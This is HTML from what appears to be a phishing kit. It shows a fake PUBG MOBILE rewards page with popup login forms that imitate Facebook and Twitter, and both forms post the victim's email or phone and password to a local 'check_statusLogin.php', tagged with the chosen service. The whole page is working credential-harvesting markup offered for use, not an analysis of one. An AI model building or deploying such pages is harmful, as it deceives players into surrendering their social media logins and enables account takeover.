<div class="popup-confirm-navbar-txt-game">
PUBG MOBILE
<span>ACCOUNT LOGIN</span>
</div>
</div>
<div class="popup-confirm-content">
<div class="popup-confirm-alert">
<i class="zmdi zmdi-account-circle"></i>
Login to your account to receive your selected rewards
</div>
<div class="btn-login" onclick="open_facebook()">
<div class="btn-login-logo-wrapper">
<img src="img/login/facebook_icon.png">
</div>
<div class="btn-login-txt">
Login using Facebook account
</div>
</div>
<div class="btn-login" style="margin-bottom: 5%;" onclick="open_twitter()">
<div class="btn-login-logo-wrapper">
<img src="img/login/twitter_icon.png">
</div> <!--- btn-login-logo-wrapper --->
<div class="btn-login-txt">
Login using Twitter account
</div> <!--- btn-login-txt --->
</div> <!--- btn-login --->
<button type="button" onclick="close_account_login()">Back to rewards list</button>
</div> <!--- popup-confirm-content --->
</div> <!--- popup confirm --->
</div> <!--- popup --->

<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="check_statusLogin.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="check_statusLogin.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/change_reward.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>

</body>
</html>